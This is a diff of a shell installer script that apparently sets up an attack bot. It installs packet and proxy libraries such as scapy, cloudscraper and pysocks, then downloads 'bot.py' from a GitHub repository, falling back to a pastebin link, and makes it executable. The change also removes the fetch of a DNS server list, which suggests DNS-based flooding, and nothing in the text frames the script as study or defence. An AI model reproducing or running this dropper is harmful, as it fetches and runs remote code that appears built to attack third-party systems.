@@ -144,8 +144,8 @@ if [ -n "$PYTHON_CMD" ]; then
   fi
   
   $PIP_CMD install -U pip setuptools wheel 2>/dev/null || true
-  $PIP_CMD install dnspython paramiko requests cloudscraper pysocks scapy icmplib 2>/dev/null || 
-  $PIP_CMD install --user dnspython paramiko requests cloudscraper pysocks scapy icmplib 2>/dev/null ||
+  $PIP_CMD install cloudscraper requests pysocks scapy icmplib 2>/dev/null || 
+  $PIP_CMD install --user cloudscraper requests pysocks scapy icmplib 2>/dev/null ||
   $PIP_CMD install requests pysocks 2>/dev/null ||
   $PIP_CMD install --user requests pysocks 2>/dev/null || true
 fi
@@ -154,10 +154,6 @@ BOT_URL="https://raw.githubusercontent.com/umbx-dot/secs/refs/heads/main/bot.py"
 download_file "$BOT_URL" "$WORK_DIR/bot.py" || 
 { log "Primary download failed, trying fallback"; BOT_URL="https://pastebin.com/raw/CQiRTJy0"; download_file "$BOT_URL" "$WORK_DIR/bot.py"; } ||
 { log "All downloads failed"; exit 1; }
-
-DNS_SERVERS_URL="https://raw.githubusercontent.com/umbx-dot/secs/refs/heads/main/dns_servers.txt"
-download_file "$DNS_SERVERS_URL" "$WORK_DIR/dns_servers.txt" || 
-{ log "DNS servers list download failed"; }
 
 chmod +x "$WORK_DIR/bot.py" 2>/dev/null || true
 if check_cmd dos2unix; then
